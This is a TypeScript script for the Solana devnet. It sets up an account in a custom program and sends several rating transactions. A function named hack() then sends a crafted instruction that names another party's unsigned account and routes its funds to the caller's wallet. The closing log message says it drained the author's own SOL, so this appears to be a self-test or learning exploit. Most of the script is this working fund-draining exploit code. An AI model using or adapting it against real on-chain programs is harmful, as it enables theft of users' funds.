import {
  clusterApiUrl,
  Connection,
  Keypair,
  PublicKey,
  SystemProgram,
  Transaction,
  TransactionInstruction,
} from "@solana/web3.js";
import {
  programOwnedAddressPrivateKey,
  programPrivateKey,
  walletPrivateKey,
} from "./private_keys";
const connection = new Connection(clusterApiUrl("devnet"), {
  commitment: "confirmed",
});
async function createAndInitializeAccount(
  wallet: Keypair,
  account: Keypair,
  program: Keypair,
) {
  const dataLength = 11 * 8 + 1; // 89
  const lamports =
    await connection.getMinimumBalanceForRentExemption(dataLength);
  const { blockhash, lastValidBlockHeight } =
    await connection.getLatestBlockhash();

  const transaction = new Transaction({
    blockhash,
    lastValidBlockHeight,
    feePayer: wallet.publicKey,
  });

  const createAccountIx = SystemProgram.createAccount({
    fromPubkey: wallet.publicKey,
    lamports,
    newAccountPubkey: account.publicKey,
    programId: program.publicKey,
    space: dataLength,
  });

  transaction.add(createAccountIx);

  const tx_string = await connection.sendTransaction(transaction, [
    account,
    wallet,
  ]);
  console.log("Confirming Transaction: ", tx_string);
  const response = await connection.confirmTransaction(tx_string, "confirmed");
  if (response.value.err) {
    throw new Error(response.value.err as string);
  }
}

async function rateAndSendSol(
  wallet: Keypair,
  account: Keypair,
  program: Keypair,
) {
  const { blockhash, lastValidBlockHeight } =
    await connection.getLatestBlockhash();

  const transaction2 = new Transaction({
    blockhash,
    lastValidBlockHeight,
    feePayer: wallet.publicKey,
  });

  transaction2.add(
    new TransactionInstruction({
      keys: [
        { isSigner: false, isWritable: true, pubkey: account.publicKey },
        {
          isSigner: true,
          isWritable: true,
          pubkey: wallet.publicKey,
        },
        {
          isSigner: false,
          isWritable: false,
          pubkey: SystemProgram.programId,
        },
      ],
      programId: program.publicKey,
      data: Buffer.from(new Uint8Array([10, 0, 0, 0, 0, 0, 0, 0])),
    }),
  );

  const tx_string = await connection.sendTransaction(transaction2, [wallet]);
  console.log("Confirming Transaction: ", tx_string);
  const response = await connection.confirmTransaction(tx_string, "confirmed");
  if (response.value.err) {
    throw new Error(response.value.err as string);
  }
}
async function hack(wallet: Keypair, account: Keypair, program: Keypair) {
  const { blockhash, lastValidBlockHeight } =
    await connection.getLatestBlockhash();

  const transaction3 = new Transaction({
    blockhash,
    lastValidBlockHeight,
    feePayer: wallet.publicKey,
  });

  transaction3.add(
    new TransactionInstruction({
      keys: [
        { isSigner: false, isWritable: true, pubkey: account.publicKey },
        {
          isSigner: false,
          isWritable: true,
          pubkey: new PublicKey("Andy1111111111111111111111111111111111111111"),
        },
        {
          isSigner: false,
          isWritable: false,
          pubkey: SystemProgram.programId,
        },
        { isSigner: false, isWritable: true, pubkey: wallet.publicKey }, // funds receiver
      ],
      programId: program.publicKey,
      data: Buffer.from(new Uint8Array([13, 5, 0, 0, 0, 0, 0, 0])),
    }),
  );

  const tx_string = await connection.sendTransaction(transaction3, [wallet]);
  console.log("Confirming Transaction: ", tx_string);
  const response = await connection.confirmTransaction(tx_string, "confirmed");
  if (response.value.err) {
    throw new Error(response.value.err as string);
  }
}

async function main() {
  const account = Keypair.fromSecretKey(
    new Uint8Array(programOwnedAddressPrivateKey),
  );
  const program = Keypair.fromSecretKey(new Uint8Array(programPrivateKey));
  const wallet = Keypair.fromSecretKey(new Uint8Array(walletPrivateKey));

  await createAndInitializeAccount(wallet, account, program);
  await rateAndSendSol(wallet, account, program);
  await rateAndSendSol(wallet, account, program);
  await rateAndSendSol(wallet, account, program);
  await hack(wallet, account, program);

  console.log("Hacking my own sols succesful 😎");
}

main();
